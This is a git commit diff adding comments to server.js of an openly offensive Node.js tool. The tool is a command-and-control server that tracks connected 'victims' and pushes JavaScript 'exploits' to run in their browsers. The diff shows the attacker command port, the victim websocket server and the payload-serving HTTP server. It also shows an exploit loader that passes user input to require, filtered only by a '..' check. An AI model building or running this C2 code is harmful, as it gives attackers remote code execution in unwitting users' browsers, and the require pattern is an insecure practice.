f3bd8068f8225543343b62c5a5d30848066ecb70
Patrick Lynch <p@tricklynch.org>
2019-04-13 00:05:28 -0400

    Added lots of comments to the server

--- server/server.js
+++ server/server.js
@@ -3,9 +3,11 @@ const ws = require('ws')
 
 const config = require('./config')
 const client = require('./client')
-let exploits = require('./exploits')
+let exploits = require('./exploits') // Not const for dynamic exploit adding
 
-const victims = {}
+const victims = {} // Map of victim name to victim connection
+
+// Whitelists which commands can be used
 const cmds = {
     'help': help,
     'list': list,
@@ -13,10 +15,12 @@ const cmds = {
     'addsploits': addsploits
 }
 
+// Tells users what commands are implemented
 function help(conn) {
     conn.send(Object.keys(cmds).join('|'))
 }
 
+// Provides information on the current state of the server
 function list(conn, args) {
     const listables = ['victims', 'exploits']
     if(args.length < 1) {
@@ -35,6 +39,7 @@ function list(conn, args) {
     }
 }
 
+// Sends an exploit to the specified client
 function exploit(conn, args) {
     if(args.length < 2) {
         conn.send('Usage: exploit who what\r\nTo do what to who')
@@ -52,21 +57,27 @@ function exploit(conn, args) {
     }
     const vic_conn = victims[who]
     vic_conn.on('message', data => conn.send(data))
+    // Adding a string and a function reference, returns the function's definition
     vic_conn.send('(' + exploits[what] + ')()')
     console.log('Sent ' + what + ' to ' + who)
 }
 
+// Adds exploits to be sent to the client
 function addsploits(conn, args) {
     if(args.length < 1) {
         conn.send('Usage: import package')
         return
     }
     try {
+        // Kids, don't put user input into require, leave that to the trained professionals
+        // Trained professionals, if there is another character sequence that leads to directory traversal here, please
+        // let me know
         const dir_trav = ['..']
         if(dir_trav.some(s => args[0].includes(s))) {
             conn.send('You can only import sploits from child directories')
             return
         }
+        // Extends the exploits object to include the imported exploits
         exploits = {...exploits, ...require('./exploits/' + args[0])}
         conn.send('' + args[0] + ' was successfully added')
     } catch {
@@ -75,14 +86,16 @@ function addsploits(conn, args) {
 }
 
 function handle_cmd(conn, cmd, args) {
+    // If the command isn't in the implemented commands, tell the user what commands are implemented
     if(undefined === cmds[cmd]) {
-        conn.send('Implemented commands: ' + Object.keys(cmds).join(','))
+        conn.send('Implemented commands: ' + Object.keys(cmds).join(', '))
     } else {
         cmds[cmd](conn, args)
     }
 }
 
 function main() {
+    // This is the server that the attacker connects to in order to control the server
     const CMD_PORT = config.cmd_port || 1337
     new ws.Server({ port: CMD_PORT })
     .on('connection', conn => {
@@ -95,6 +108,22 @@ function main() {
     })
     console.log('Command server running on port ' + CMD_PORT)
 
+    // This is the server that sends exploits to victims' browsers
+    const EXPLOIT_PORT = config.exploit_port || 8000
+    new ws.Server({ port: EXPLOIT_PORT })
+    .on('connection', (conn, req) => {
+        const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
+        // TODO Include the victim's origin
+        victims[vic_name] = conn
+        console.log('New victim ' + vic_name)
+        // TODO Implement the ability to automatically run commands on connect
+        // This removes a victim when the connection to their browser is no longer open
+        conn.on('close', () => delete victims[vic_name])
+    })
+    console.log('Exploit server running on port ' + EXPLOIT_PORT)
+
+    // This is the server that the victim's browser initially connects to in order to get the client
+    // The client then executes whatever exploit gets sent to it
     const CLIENT_PORT = config.client_port || 8080
     http.createServer((req, res) => {
         const HOST = config.host || 'localhost'
@@ -104,18 +133,6 @@ function main() {
         res.end(client_payload)
     }).listen(CLIENT_PORT)
     console.log('Payload server running on port ' + CLIENT_PORT)
-
-    const EXPLOIT_PORT = config.exploit_port || 8000
-    new ws.Server({ port: EXPLOIT_PORT })
-    .on('connection', (conn, req) => {
-        const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
-        // TODO Include the victim's origin
-        victims[vic_name] = conn
-        console.log('New victim ' + vic_name)
-        // TODO Implement the ability to automatically run commands on connect
-        conn.on('close', () => delete victims[vic_name])
-    })
-    console.log('Exploit server running on port ' + EXPLOIT_PORT)
 }
 
 main()
